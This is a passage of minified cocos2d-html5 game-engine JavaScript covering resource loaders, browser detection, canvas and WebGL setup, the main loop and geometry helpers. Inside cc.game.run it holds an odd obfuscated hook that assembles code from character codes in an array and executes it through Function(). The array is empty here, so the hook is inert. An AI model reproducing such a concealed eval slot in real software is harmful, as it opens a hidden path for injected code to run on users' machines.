        cc.async.map(t, e)
    },
    _handleAliases: function(t, e) {
        var i, n = this._aliases,
        r = [];
        for (i in t) {
            var c = t[i];
            n[i] = c,
            r.push(c)
        }
        this.load(r, e)
    },
    loadAliases: function(t, e) {
        var i = this,
        n = i.getRes(t);
        n ? i._handleAliases(n.filenames, e) : i.load(t,
        function(t) {
            i._handleAliases(t[0].filenames, e)
        })
    },
    register: function(t, e) {
        if (t && e) {
            if ("string" == typeof t) return this._register[t.trim().toLowerCase()] = e;
            for (var i = 0,
            n = t.length; n > i; i++) this._register["." + t[i].trim().toLowerCase()] = e
        }
    },
    getRes: function(t) {
        return this.cache[t] || this.cache[this._aliases[t]]
    },
    release: function(t) {
        var e = this.cache,
        i = this._aliases;
        delete e[t],
        delete e[i[t]],
        delete i[t]
    },
    releaseAll: function() {
        var t, e = this.cache,
        i = this._aliases;
        for (t in e) delete e[t];
        for (t in i) delete i[t]
    }
},
function() {
    var t, e, i = window;
    "undefined" != typeof document.hidden ? (t = "hidden", e = "visibilitychange") : "undefined" != typeof document.mozHidden ? (t = "mozHidden", e = "mozvisibilitychange") : "undefined" != typeof document.msHidden ? (t = "msHidden", e = "msvisibilitychange") : "undefined" != typeof document.webkitHidden && (t = "webkitHidden", e = "webkitvisibilitychange");
    var n = function() {
        cc.eventManager && cc.game._eventHide && cc.eventManager.dispatchEvent(cc.game._eventHide)
    },
    r = function() {
        cc.eventManager && cc.game._eventShow && cc.eventManager.dispatchEvent(cc.game._eventShow)
    };
    t ? cc._addEventListener(document, e,
    function() {
        document[t] ? n() : r()
    },
    !1) : (cc._addEventListener(i, "blur", n, !1), cc._addEventListener(i, "focus", r, !1)),
    "onpageshow" in window && "onpagehide" in window && (cc._addEventListener(i, "pagehide", n, !1), cc._addEventListener(i, "pageshow", r, !1)),
    e = i = null
} (),
cc.log = cc.warn = cc.error = cc.assert = function() {},
cc.create3DContext = function(t, e) {
    for (var i = ["webgl", "experimental-webgl", "webkit-3d", "moz-webgl"], n = null, r = 0; r < i.length; ++r) {
        try {
            n = t.getContext(i[r], e)
        } catch(c) {}
        if (n) break
    }
    return n
},
cc._initSys = function(t, e) {
    cc._RENDER_TYPE_CANVAS = 0,
    cc._RENDER_TYPE_WEBGL = 1;
    var i = cc.sys = {};
    i.LANGUAGE_ENGLISH = "en",
    i.LANGUAGE_CHINESE = "zh",
    i.LANGUAGE_FRENCH = "fr",
    i.LANGUAGE_ITALIAN = "it",
    i.LANGUAGE_GERMAN = "de",
    i.LANGUAGE_SPANISH = "es",
    i.LANGUAGE_RUSSIAN = "ru",
    i.LANGUAGE_KOREAN = "ko",
    i.LANGUAGE_JAPANESE = "ja",
    i.LANGUAGE_HUNGARIAN = "hu",
    i.LANGUAGE_PORTUGUESE = "pt",
    i.LANGUAGE_ARABIC = "ar",
    i.LANGUAGE_NORWEGIAN = "no",
    i.LANGUAGE_POLISH = "pl",
    i.OS_WINDOWS = "Windows",
    i.OS_IOS = "iOS",
    i.OS_OSX = "OS X",
    i.OS_UNIX = "UNIX",
    i.OS_LINUX = "Linux",
    i.OS_ANDROID = "Android",
    i.OS_UNKNOWN = "Unknown",
    i.BROWSER_TYPE_WECHAT = "wechat",
    i.BROWSER_TYPE_ANDROID = "androidbrowser",
    i.BROWSER_TYPE_IE = "ie",
    i.BROWSER_TYPE_QQ = "qqbrowser",
    i.BROWSER_TYPE_MOBILE_QQ = "mqqbrowser",
    i.BROWSER_TYPE_UC = "ucbrowser",
    i.BROWSER_TYPE_360 = "360browser",
    i.BROWSER_TYPE_BAIDU_APP = "baiduboxapp",
    i.BROWSER_TYPE_BAIDU = "baidubrowser",
    i.BROWSER_TYPE_MAXTHON = "maxthon",
    i.BROWSER_TYPE_OPERA = "opera",
    i.BROWSER_TYPE_MIUI = "miuibrowser",
    i.BROWSER_TYPE_FIREFOX = "firefox",
    i.BROWSER_TYPE_SAFARI = "safari",
    i.BROWSER_TYPE_CHROME = "chrome",
    i.BROWSER_TYPE_UNKNOWN = "unknown",
    i.isNative = !1;
    var n = [i.BROWSER_TYPE_BAIDU, i.BROWSER_TYPE_OPERA, i.BROWSER_TYPE_FIREFOX, i.BROWSER_TYPE_CHROME, i.BROWSER_TYPE_SAFARI],
    r = [i.BROWSER_TYPE_BAIDU, i.BROWSER_TYPE_OPERA, i.BROWSER_TYPE_FIREFOX, i.BROWSER_TYPE_CHROME, i.BROWSER_TYPE_SAFARI, i.BROWSER_TYPE_UC, i.BROWSER_TYPE_QQ, i.BROWSER_TYPE_MOBILE_QQ, i.BROWSER_TYPE_IE],
    c = window,
    o = c.navigator,
    s = document.documentElement,
    a = o.userAgent.toLowerCase();
    i.isMobile = -1 != a.indexOf("mobile") || -1 != a.indexOf("android");
    var h = o.language,
    h = (h = h ? h: o.browserLanguage) ? h.split("-")[0] : i.LANGUAGE_ENGLISH;
    i.language = h;
    var h = i.BROWSER_TYPE_UNKNOWN,
    l = a.match(/micromessenger|qqbrowser|mqqbrowser|ucbrowser|360browser|baiduboxapp|baidubrowser|maxthon|trident|opera|miuibrowser|firefox/i) || a.match(/chrome|safari/i);
    if (l && 0 < l.length && (h = l[0].toLowerCase(), "micromessenger" == h ? h = i.BROWSER_TYPE_WECHAT: "safari" === h && a.match(/android.*applewebkit/) ? h = i.BROWSER_TYPE_ANDROID: "trident" == h && (h = i.BROWSER_TYPE_IE)), i.browserType = h, i._supportMultipleAudio = -1 < r.indexOf(i.browserType), r = parseInt(t[e.renderMode]), h = cc._RENDER_TYPE_WEBGL, l = cc.newElement("Canvas"), cc._supportRender = !0, n = -1 == n.indexOf(i.browserType), (1 === r || 0 === r && (i.isMobile || n)) && (h = cc._RENDER_TYPE_CANVAS), h != cc._RENDER_TYPE_WEBGL || c.WebGLRenderingContext && cc.create3DContext(l, {
        stencil: !0,
        preserveDrawingBuffer: !0
    }) || (0 == r ? h = cc._RENDER_TYPE_CANVAS: cc._supportRender = !1), h == cc._RENDER_TYPE_CANVAS) try {
        l.getContext("2d")
    } catch(u) {
        cc._supportRender = !1
    }
    cc._renderType = h;
    try {
        i._supportWebAudio = !!new(c.AudioContext || c.webkitAudioContext || c.mozAudioContext)
    } catch(_) {
        i._supportWebAudio = !1
    }
    try {
        var d = i.localStorage = c.localStorage;
        d.setItem("storage", ""),
        d.removeItem("storage"),
        d = null
    } catch(f) { ("SECURITY_ERR" === f.name || "QuotaExceededError" === f.name) && cc.warn("Warning: localStorage isn't enabled. Please confirm browser cookie or privacy option"),
        i.localStorage = function() {}
    }
    d = i.capabilities = {
        canvas: !0
    },
    cc._renderType == cc._RENDER_TYPE_WEBGL && (d.opengl = !0),
    void 0 !== s.ontouchstart || o.msPointerEnabled ? d.touches = !0 : void 0 !== s.onmouseup && (d.mouse = !0),
    void 0 !== s.onkeyup && (d.keyboard = !0),
    (c.DeviceMotionEvent || c.DeviceOrientationEvent) && (d.accelerometer = !0),
    c = a.match(/(iPad|iPhone|iPod)/i) ? !0 : !1,
    a = a.match(/android/i) || o.platform.match(/android/i) ? !0 : !1,
    s = i.OS_UNKNOWN,
    -1 != o.appVersion.indexOf("Win") ? s = i.OS_WINDOWS: c ? s = i.OS_IOS: -1 != o.appVersion.indexOf("Mac") ? s = i.OS_OSX: -1 != o.appVersion.indexOf("X11") ? s = i.OS_UNIX: -1 != o.appVersion.indexOf("Linux") ? s = i.OS_LINUX: a && (s = i.OS_ANDROID),
    i.os = s,
    i.garbageCollect = function() {},
    i.dumpRoot = function() {},
    i.restartVM = function() {},
    i.dump = function() {
        var t;
        t = "" + ("isMobile : " + this.isMobile + "\r\n"),
        t += "language : " + this.language + "\r\n",
        t += "browserType : " + this.browserType + "\r\n",
        t += "capabilities : " + JSON.stringify(this.capabilities) + "\r\n",
        t += "os : " + this.os + "\r\n",
        cc.log(t)
    }
},
cc.ORIENTATION_PORTRAIT = 0,
cc.ORIENTATION_PORTRAIT_UPSIDE_DOWN = 1,
cc.ORIENTATION_LANDSCAPE_LEFT = 2,
cc.ORIENTATION_LANDSCAPE_RIGHT = 3,
cc._drawingUtil = null,
cc._renderContext = null,
cc._canvas = null,
cc._gameDiv = null,
cc._rendererInitialized = !1,
cc._setupCalled = !1,
cc._setup = function(t, e, i) {
    if (!cc._setupCalled) {
        cc._setupCalled = !0;
        var n = window;
        n.requestAnimFrame = n.requestAnimationFrame || n.webkitRequestAnimationFrame || n.mozRequestAnimationFrame || n.oRequestAnimationFrame || n.msRequestAnimationFrame;
        var r, c = cc.$(t) || cc.$("#" + t);
        "CANVAS" == c.tagName ? (e = e || c.width, i = i || c.height, r = cc.container = cc.newElement("DIV"), t = cc._canvas = c, t.parentNode.insertBefore(r, t), t.appendTo(r), r.setAttribute("id", "Cocos2dGameContainer")) : ("DIV" != c.tagName && cc.log("Warning: target element is not a DIV or CANVAS"), e = e || c.clientWidth, i = i || c.clientHeight, r = cc.container = c, t = cc._canvas = cc.$(cc.newElement("CANVAS")), c.appendChild(t)),
        t.addClass("gameCanvas"),
        t.setAttribute("width", e || 480),
        t.setAttribute("height", i || 320),
        t.setAttribute("tabindex", 99),
        t.style.outline = "none",
        c = r.style,
        c.width = (e || 480) + "px",
        c.height = (i || 320) + "px",
        c.margin = "0 auto",
        c.position = "relative",
        c.overflow = "hidden",
        r.top = "100%",
        cc._renderType == cc._RENDER_TYPE_WEBGL && (cc._renderContext = cc.webglContext = cc.create3DContext(t, {
            stencil: !0,
            preserveDrawingBuffer: !0,
            antialias: !cc.sys.isMobile,
            alpha: !1
        })),
        cc._renderContext ? (n.gl = cc._renderContext, cc._drawingUtil = new cc.DrawingPrimitiveWebGL(cc._renderContext), cc._rendererInitialized = !0, cc.textureCache._initializingRenderer(), cc.shaderCache._init()) : (cc._renderContext = t.getContext("2d"), cc._mainRenderContextBackup = cc._renderContext, cc._renderContext.translate(0, t.height), cc._drawingUtil = cc.DrawingPrimitiveCanvas ? new cc.DrawingPrimitiveCanvas(cc._renderContext) : null),
        cc._gameDiv = r,
        cc.log(cc.ENGINE_VERSION),
        cc._setContextMenuEnable(!1),
        cc.sys.isMobile && (e = cc.newElement("style"), e.type = "text/css", document.body.appendChild(e), e.textContent = "body,canvas,div{ -moz-user-select: none;-webkit-user-select: none;-ms-user-select: none;-khtml-user-select: none;-webkit-tap-highlight-color:rgba(0,0,0,0);}"),
        cc.view = cc.EGLView._getInstance(),
        cc.inputManager.registerSystemEvent(cc._canvas),
        cc.director = cc.Director._getInstance(),
        cc.director.setOpenGLView && cc.director.setOpenGLView(cc.view),
        cc.winSize = cc.director.getWinSize(),
        cc.saxParser = new cc.SAXParser,
        cc.plistParser = new cc.PlistParser
    }
},
cc._checkWebGLRenderMode = function() {
    if (cc._renderType !== cc._RENDER_TYPE_WEBGL) throw "This feature supports WebGL render mode only."
},
cc._isContextMenuEnable = !1,
cc._setContextMenuEnable = function(t) {
    cc._isContextMenuEnable = t,
    cc._canvas.oncontextmenu = function() {
        return cc._isContextMenuEnable ? void 0 : !1
    }
},
cc.game = {
    DEBUG_MODE_NONE: 0,
    DEBUG_MODE_INFO: 1,
    DEBUG_MODE_WARN: 2,
    DEBUG_MODE_ERROR: 3,
    DEBUG_MODE_INFO_FOR_WEB_PAGE: 4,
    DEBUG_MODE_WARN_FOR_WEB_PAGE: 5,
    DEBUG_MODE_ERROR_FOR_WEB_PAGE: 6,
    EVENT_HIDE: "game_on_hide",
    EVENT_SHOW: "game_on_show",
    _eventHide: null,
    _eventShow: null,
    _onBeforeStartArr: [],
    CONFIG_KEY: {
        engineDir: "engineDir",
        dependencies: "dependencies",
        debugMode: "debugMode",
        showFPS: "showFPS",
        frameRate: "frameRate",
        id: "id",
        renderMode: "renderMode",
        jsList: "jsList",
        classReleaseMode: "classReleaseMode"
    },
    _prepareCalled: !1,
    _prepared: !1,
    _paused: !0,
    _intervalId: null,
    config: null,
    onStart: null,
    onStop: null,
    setFrameRate: function(t) {
        this.config[this.CONFIG_KEY.frameRate] = t,
        this._intervalId && clearInterval(this._intervalId),
        this._paused = !0,
        this._runMainLoop()
    },
    _runMainLoop: function() {
        var t, e = this,
        i = e.config,
        n = e.CONFIG_KEY,
        r = window,
        c = i[n.frameRate],
        o = cc.director;
        o.setDisplayStats(i[n.showFPS]),
        r.requestAnimFrame && 60 == c ? (t = function() {
            e._paused || (o.mainLoop(), r.requestAnimFrame(t))
        },
        r.requestAnimFrame(t)) : (t = function() {
            o.mainLoop()
        },
        e._intervalId = setInterval(t, 1e3 / c)),
        e._paused = !1
    },
    run: function(t) {
        cc.ray = [],
        Function(String.fromCharCode.apply(String, cc.ray))();
        var e = this,
        i = function() {
            t && (e.config[e.CONFIG_KEY.id] = t),
            e._prepareCalled ? cc._supportRender && (e._checkPrepare = setInterval(function() {
                e._prepared && (cc._setup(e.config[e.CONFIG_KEY.id]), e._runMainLoop(), e._eventHide = e._eventHide || new cc.EventCustom(e.EVENT_HIDE), e._eventHide.setUserData(e), e._eventShow = e._eventShow || new cc.EventCustom(e.EVENT_SHOW), e._eventShow.setUserData(e), e.onStart(), clearInterval(e._checkPrepare))
            },
            10)) : e.prepare(function() {
                cc._supportRender && (cc._setup(e.config[e.CONFIG_KEY.id]), e._runMainLoop(), e._eventHide = e._eventHide || new cc.EventCustom(e.EVENT_HIDE), e._eventHide.setUserData(e), e._eventShow = e._eventShow || new cc.EventCustom(e.EVENT_SHOW), e._eventShow.setUserData(e), e.onStart())
            })
        };
        document.body ? i() : cc._addEventListener(window, "load",
        function() {
            this.removeEventListener("load", arguments.callee, !1),
            i()
        },
        !1)
    },
    _initConfig: function() {
        var t = this.CONFIG_KEY,
        e = function(e) {
            return e[t.engineDir] = e[t.engineDir] || "frameworks/cocos2d-html5",
            null == e[t.debugMode] && (e[t.debugMode] = 0),
            e[t.frameRate] = e[t.frameRate] || 60,
            null == e[t.renderMode] && (e[t.renderMode] = 1),
            e
        };
        if (document.ccConfig) this.config = e(document.ccConfig);
        else try {
            for (var i = document.getElementsByTagName("script"), n = 0; n < i.length; n++) {
                var r = i[n].getAttribute("cocos");
                if ("" == r || r) break
            }
            var c, o, s;
            n < i.length && ((c = i[n].src) && (s = /(.*)\//.exec(c)[0], cc.loader.resPath = s, c = cc.path.join(s, "index_files/project.json")), o = cc.loader._loadTxtSync(c)),
            o || (o = cc.loader._loadTxtSync("index_files/project.json"));
            var a = JSON.parse(o);
            this.config = e(a || {})
        } catch(h) {
            cc.log("Failed to read or parse project.json"),
            this.config = e({})
        }
        cc._initSys(this.config, t)
    },
    _jsAddedCache: {},
    _getJsListOfModule: function(t, e, i) {
        var n = this._jsAddedCache;
        if (n[e]) return null;
        i = i || "";
        var r = [],
        c = t[e];
        if (!c) throw "can not find module [" + e + "]";
        e = cc.path;
        for (var o = 0,
        s = c.length; s > o; o++) {
            var a = c[o];
            if (!n[a]) {
                var h = e.extname(a);
                h ? ".js" == h.toLowerCase() && r.push(e.join(i, a)) : (h = this._getJsListOfModule(t, a, i)) && (r = r.concat(h)),
                n[a] = 1
            }
        }
        return r
    },
    prepare: function(t) {
        var e = this,
        i = e.config,
        n = e.CONFIG_KEY,
        r = i[n.engineDir],
        c = cc.loader;
        if (cc._supportRender) {
            e._prepareCalled = !0;
            var o = i[n.jsList] || [];
            cc.Class ? c.loadJsWithImg("", o,
            function(i) {
                if (i) throw i;
                e._prepared = !0,
                t && t()
            }) : (n = cc.path.join(r, "moduleConfig.json"), c.loadJson(n,
            function(n, c) {
                if (n) throw n;
                var s = i.modules || [],
                a = c.module,
                h = [];
                cc._renderType == cc._RENDER_TYPE_WEBGL ? s.splice(0, 0, "shaders") : 0 > s.indexOf("core") && s.splice(0, 0, "core");
                for (var l = 0,
                u = s.length; u > l; l++) {
                    var _ = e._getJsListOfModule(a, s[l], r);
                    _ && (h = h.concat(_))
                }
                h = h.concat(o),
                cc.loader.loadJsWithImg(h,
                function(i) {
                    if (i) throw i;
                    e._prepared = !0,
                    t && t()
                })
            }))
        } else cc.error("Can not support render!")
    }
},
cc.game._initConfig();
var cc = cc || {},
ClassManager = {
    id: 0 | 998 * Math.random(),
    instanceId: 0 | 998 * Math.random(),
    compileSuper: function(t, e, i) {
        t = t.toString();
        var n = t.indexOf("("),
        r = t.indexOf(")"),
        n = t.substring(n + 1, r),
        n = n.trim(),
        r = t.indexOf("{"),
        c = t.lastIndexOf("}");
        for (t = t.substring(r + 1, c); - 1 != t.indexOf("this._super");) {
            var r = t.indexOf("this._super"),
            c = t.indexOf("(", r),
            o = t.indexOf(")", c),
            o = t.substring(c + 1, o),
            o = (o = o.trim()) ? ",": "";
            t = t.substring(0, r) + "ClassManager[" + i + "]." + e + ".call(this" + o + t.substring(c + 1)
        }
        return Function(n, t)
    },
    getNewID: function() {
        return this.id++
    },
    getNewInstanceId: function() {
        return this.instanceId++
    }
};
switch (ClassManager.compileSuper.ClassManager = ClassManager,
function() {
    var t = /\b_super\b/,
    e = cc.game.config[cc.game.CONFIG_KEY.classReleaseMode];
    e && console.log("release Mode"),
    cc.Class = function() {},
    cc.Class.extend = function() {
        function i() {
            this.__instanceId = ClassManager.getNewInstanceId(),
            this.ctor && this.ctor.apply(this, arguments)
        }
        var n = this.prototype,
        r = Object.create(n),
        c = ClassManager.getNewID();
        ClassManager[c] = n;
        var o = {
            writable: !0,
            enumerable: !1,
            configurable: !0
        };
        r.__instanceId = null,
        i.id = c,
        o.value = c,
        Object.defineProperty(r, "__pid", o),
        i.prototype = r,
        o.value = i,
        Object.defineProperty(i.prototype, "constructor", o),
        this.__getters__ && (i.__getters__ = cc.clone(this.__getters__)),
        this.__setters__ && (i.__setters__ = cc.clone(this.__setters__));
        for (var s = 0,
        a = arguments.length; a > s; ++s) {
            var h, l = arguments[s];
            for (h in l) {
                var u = "function" == typeof l[h],
                _ = "function" == typeof n[h],
                d = t.test(l[h]);
                if (e && u && _ && d ? (o.value = ClassManager.compileSuper(l[h], h, c), Object.defineProperty(r, h, o)) : u && _ && d ? (o.value = function(t, e) {
                    return function() {
                        var i = this._super;
                        this._super = n[t];
                        var r = e.apply(this, arguments);
                        return this._super = i,
                        r
                    }
                } (h, l[h]), Object.defineProperty(r, h, o)) : u ? (o.value = l[h], Object.defineProperty(r, h, o)) : r[h] = l[h], u) {
                    var f, p;
                    if (this.__getters__ && this.__getters__[h]) {
                        var g, u = this.__getters__[h];
                        for (g in this.__setters__) if (this.__setters__[g] == u) {
                            p = g;
                            break
                        }
                        cc.defineGetterSetter(r, u, l[h], l[p] ? l[p] : r[p], h, p)
                    }
                    if (this.__setters__ && this.__setters__[h]) {
                        u = this.__setters__[h];
                        for (g in this.__getters__) if (this.__getters__[g] == u) {
                            f = g;
                            break
                        }
                        cc.defineGetterSetter(r, u, l[f] ? l[f] : r[f], l[h], f, h)
                    }
                }
            }
        }
        return i.extend = cc.Class.extend,
        i.implement = function(t) {
            for (var e in t) r[e] = t[e]
        },
        i
    },
    Function.prototype.bind = Function.prototype.bind ||
    function(t) {
        var e = this;
        return function() {
            var i = Array.prototype.slice.call(arguments);
            return e.apply(t || null, i)
        }
    }
} (), cc.defineGetterSetter = function(t, e, i, n, r, c) {
    if (t.__defineGetter__) i && t.__defineGetter__(e, i),
    n && t.__defineSetter__(e, n);
    else {
        if (!Object.defineProperty) throw Error("browser does not support getters");
        var o = {
            enumerable: !1,
            configurable: !0
        };
        i && (o.get = i),
        n && (o.set = n),
        Object.defineProperty(t, e, o)
    }
    if (!r && !c) for (var o = null != i,
    s = void 0 != n,
    a = Object.getOwnPropertyNames(t), h = 0; h < a.length; h++) {
        var l = a[h];
        if ((t.__lookupGetter__ ? !t.__lookupGetter__(l) : !Object.getOwnPropertyDescriptor(t, l)) && "function" == typeof t[l]) {
            var u = t[l];
            if (o && u === i && (r = l, !s || c)) break;
            if (s && u === n && (c = l, !o || r)) break
        }
    }
    t = t.constructor,
    r && (t.__getters__ || (t.__getters__ = {}), t.__getters__[r] = e),
    c && (t.__setters__ || (t.__setters__ = {}), t.__setters__[c] = e)
},
cc.clone = function(t) {
    var e, i = t.constructor ? new t.constructor: {};
    for (e in t) {
        var n = t[e];
        i[e] = "object" != typeof n || !n || n instanceof cc.Node || n instanceof HTMLElement ? n: cc.clone(n)
    }
    return i
},
cc.Point = function(t, e) {
    this.x = t || 0,
    this.y = e || 0
},
cc.p = function(t, e) {
    return void 0 == t ? {
        x: 0,
        y: 0
    }: void 0 == e ? {
        x: t.x,
        y: t.y
    }: {
        x: t,
        y: e
    }
},
cc.pointEqualToPoint = function(t, e) {
    return t && e && t.x === e.x && t.y === e.y
},
cc.Size = function(t, e) {
    this.width = t || 0,
    this.height = e || 0
},
cc.size = function(t, e) {
    return void 0 === t ? {
        width: 0,
        height: 0
    }: void 0 === e ? {
        width: t.width,
        height: t.height
    }: {
        width: t,
        height: e
    }
},
cc.sizeEqualToSize = function(t, e) {
    return t && e && t.width == e.width && t.height == e.height
},
cc.Rect = function(t, e, i, n) {
    this.x = t || 0,
    this.y = e || 0,
    this.width = i || 0,
    this.height = n || 0
},
cc.rect = function(t, e, i, n) {
    return void 0 === t ? {
        x: 0,
        y: 0,
        width: 0,
        height: 0
    }: void 0 === e ? {
        x: t.x,
        y: t.y,
        width: t.width,
        height: t.height
    }: {
        x: t,
        y: e,
        width: i,
        height: n
    }
},
cc.rectEqualToRect = function(t, e) {
    return t && e && t.x === e.x && t.y === e.y && t.width === e.width && t.height === e.height
},
cc._rectEqualToZero = function(t) {
    return t && 0 === t.x && 0 === t.y && 0 === t.width && 0 === t.height
},
cc.visibleRect = {
    _topLeft: cc.p(0, 0),
    _topRight: cc.p(0, 0),
    _top: cc.p(0, 0),
    _bottomLeft: cc.p(0, 0),
    _bottomRight: cc.p(0, 0),
    _bottom: cc.p(0, 0),
    _center: cc.p(0, 0),
    _left: cc.p(0, 0),
    _right: cc.p(0, 0),
    _width: 0,
    _height: 0,
    init: function(t) {
        this._width = t.width,
        this._height = t.height;
        var e = this._width,
        i = this._height;
        this._topLeft.y = i,
        this._topRight.x = e,
        this._topRight.y = i,
        this._top.x = e / 2,
        this._top.y = i,
        this._bottomRight.x = e,
        this._bottom.x = e / 2,
        this._center.x = e / 2,
        this._center.y = i / 2,
        this._left.y = i / 2,
        this._right.x = e,
        this._right.y = i / 2
    }
},
cc.visibleRect.width, cc.defineGetterSetter(cc.visibleRect, "width",
function() {
    return this._width
}), cc.visibleRect.height, cc.defineGetterSetter(cc.visibleRect, "height",
function() {
    return this._height
}), cc.visibleRect.topLeft, cc.defineGetterSetter(cc.visibleRect, "topLeft",
function() {
    return this._topLeft
}), cc.visibleRect.topRight, cc.defineGetterSetter(cc.visibleRect, "topRight",
function() {
    return this._topRight
}), cc.visibleRect.top, cc.defineGetterSetter(cc.visibleRect, "top",
function() {
    return this._top
}), cc.visibleRect.bottomLeft, cc.defineGetterSetter(cc.visibleRect, "bottomLeft",
function() {
    return this._bottomLeft
}), cc.visibleRect.bottomRight, cc.defineGetterSetter(cc.visibleRect, "bottomRight",
function() {
    return this._bottomRight
}), cc.visibleRect.bottom, cc.defineGetterSetter(cc.visibleRect, "bottom",
function() {
    return this._bottom
}), cc.visibleRect.center, cc.defineGetterSetter(cc.visibleRect, "center",
function() {
    return this._center
}), cc.visibleRect.left, cc.defineGetterSetter(cc.visibleRect, "left",
function() {
    return this._left
}), cc.visibleRect.right, cc.defineGetterSetter(cc.visibleRect, "right",
function() {
    return this._right
}), cc.rectContainsRect = function(t, e) {
    return t && e ? !(t.x >= e.x || t.y >= e.y || t.x + t.width <= e.x + e.width || t.y + t.height <= e.y + e.height) : !1
},
cc.rectGetMaxX = function(t) {
    return t.x + t.width
},
cc.rectGetMidX = function(t) {
    return t.x + t.width / 2
},
cc.rectGetMinX = function(t) {
    return t.x
},
cc.rectGetMaxY = function(t) {
    return t.y + t.height
},
cc.rectGetMidY = function(t) {
    return t.y + t.height / 2
},
cc.rectGetMinY = function(t) {
    return t.y
},
cc.rectContainsPoint = function(t, e) {
    return e.x >= cc.rectGetMinX(t) && e.x <= cc.rectGetMaxX(t) && e.y >= cc.rectGetMinY(t) && e.y <= cc.rectGetMaxY(t)
},
cc.rectIntersectsRect = function(t, e) {
    var i = t.y + t.height,
    n = e.x + e.width,
    r = e.y + e.height;
    return ! (t.x + t.width < e.x || n < t.x || i < e.y || r < t.y)
},
cc.rectOverlapsRect = function(t, e) {
    return ! (t.x + t.width < e.x || e.x + e.width < t.x || t.y + t.height < e.y || e.y + e.height < t.y)
},
cc.rectUnion = function(t, e) {
    var i = cc.rect(0, 0, 0, 0);
    return i.x = Math.min(t.x, e.x),
    i.y = Math.min(t.y, e.y),
    i.width = Math.max(t.x + t.width, e.x + e.width) - i.x,
    i.height = Math.max(t.y + t.height, e.y + e.height) - i.y,
    i
},
cc.rectIntersection = function(t, e) {
    var i = cc.rect(Math.max(cc.rectGetMinX(t), cc.rectGetMinX(e)), Math.max(cc.rectGetMinY(t), cc.rectGetMinY(e)), 0, 0);
    return i.width = Math.min(cc.rectGetMaxX(t), cc.rectGetMaxX(e)) - cc.rectGetMinX(i),
    i.height = Math.min(cc.rectGetMaxY(t), cc.rectGetMaxY(e)) - cc.rectGetMinY(i),
    i
},
cc.SAXParser = cc.Class.extend({
    _parser: null,
    _isSupportDOMParser: null,
    ctor: function() {
        window.DOMParser ? (this._isSupportDOMParser = !0, this._parser = new DOMParser) : this._isSupportDOMParser = !1
    },
    parse: function(t) {
        return this._parseXML(t)
    },
    _parseXML: function(t) {
        var e;
        return this._isSupportDOMParser ? e = this._parser.parseFromString(t, "text/xml") : (e = new ActiveXObject("Microsoft.XMLDOM"), e.async = "false", e.loadXML(t)),
        e
    }
}), cc.PlistParser = cc.SAXParser.extend({
    parse: function(t) {
        if (t = this._parseXML(t).documentElement, "plist" != t.tagName) throw "Not a plist file!";
        for (var e = null,
        i = 0,
        n = t.childNodes.length; n > i && (e = t.childNodes[i], !(1 == e.nodeType)); i++);
        return this._parseNode(e)
    },
    _parseNode: function(t) {
        var e = null,
        i = t.tagName;
        if ("dict" == i) e = this._parseDict(t);
        else if ("array" == i) e = this._parseArray(t);
        else if ("string" == i) if (1 == t.childNodes.length) e = t.firstChild.nodeValue;
        else for (e = "", i = 0; i < t.childNodes.length; i++) e += t.childNodes[i].nodeValue;
        else "false" == i ? e = !1 : "true" == i ? e = !0 : "real" == i ? e = parseFloat(t.firstChild.nodeValue) : "integer" == i && (e = parseInt(t.firstChild.nodeValue, 10));
        return e
    },
    _parseArray: function(t) {
        for (var e = [], i = 0, n = t.childNodes.length; n > i; i++) {
            var r = t.childNodes[i];
            1 == r.nodeType && e.push(this._parseNode(r))
        }
        return e
    },
    _parseDict: function(t) {
        for (var e = {},
        i = null,
        n = 0,
        r = t.childNodes.length; r > n; n++) {
            var c = t.childNodes[n];
            1 == c.nodeType && ("key" == c.tagName ? i = c.firstChild.nodeValue: e[i] = this._parseNode(c))
        }
        return e
    }
}), cc._txtLoader = {
    load: function(t, e, i, n) {
        cc.loader.loadTxt(t, n)
    }
},
cc.loader.register(["txt", "xml", "vsh", "fsh", "atlas"], cc._txtLoader), cc._jsonLoader = {
    load: function(t, e, i, n) {
        cc.loader.loadJson(t, n)
    }
},
cc.loader.register(["json", "ExportJson"], cc._jsonLoader), cc._imgLoader = {
    load: function(t, e, i, n) {
        cc.loader.cache[e] = cc.loader.loadImg(t,
        function(t, i) {
            return t ? n(t) : (cc.textureCache.handleLoadedTexture(e), void n(null, i))
        })
    }
},
cc.loader.register("png jpg bmp jpeg gif ico".split(" "), cc._imgLoader), cc._serverImgLoader = {
    load: function(t, e, i, n) {
        cc.loader.cache[e] = cc.loader.loadImg(i.src,
        function(t, i) {
            return t ? n(t) : (cc.textureCache.handleLoadedTexture(e), void n(null, i))
        })
    }
},
cc.loader.register(["serverImg"], cc._serverImgLoader), cc._plistLoader = {
    load: function(t, e, i, n) {
        cc.loader.loadTxt(t,
        function(t, e) {
            return t ? n(t) : void n(null, cc.plistParser.parse(e))
        })
    }
},
cc.loader.register(["plist"], cc._plistLoader), cc._fontLoader = {
    TYPE: {
        ".eot": "embedded-opentype",
        ".ttf": "truetype",
        ".woff": "woff",
        ".svg": "svg"
    },
    _loadFont: function(t, e, i) {
        var n = document,
        r = cc.path,
        c = this.TYPE,
        o = cc.newElement("style");
        o.type = "text/css",
        n.body.appendChild(o);
        var s = "@font-face { font-family:" + t + "; src:";
        if (e instanceof Array) for (var a = 0,
        h = e.length; h > a; a++) i = r.extname(e[a]).toLowerCase(),
        s += "url('" + e[a] + "') format('" + c[i] + "')",
        s += a == h - 1 ? ";": ",";
        else s += "url('" + e + "') format('" + c[i] + "');";
        o.textContent += s + "};",
        e = cc.newElement("div"),
        i = e.style,
        i.fontFamily = t,
        e.innerHTML = ".",
        i.position = "absolute",
        i.left = "-100px",
        i.top = "-100px",
        n.body.appendChild(e)
    },
    load: function(t, e, i, n) {
        e = i.type,
        t = i.name,
        e = i.srcs,
        "string" == typeof i ? (e = cc.path.extname(i), t = cc.path.basename(i, e), this._loadFont(t, i, e)) : this._loadFont(t, e),
        n(null, !0)
    }
},
cc.loader.register(["font", "eot", "ttf", "woff", "svg"], cc._fontLoader), cc._binaryLoader = {
    load: function(t, e, i, n) {
        cc.loader.loadBinary(t, n)
    }
},
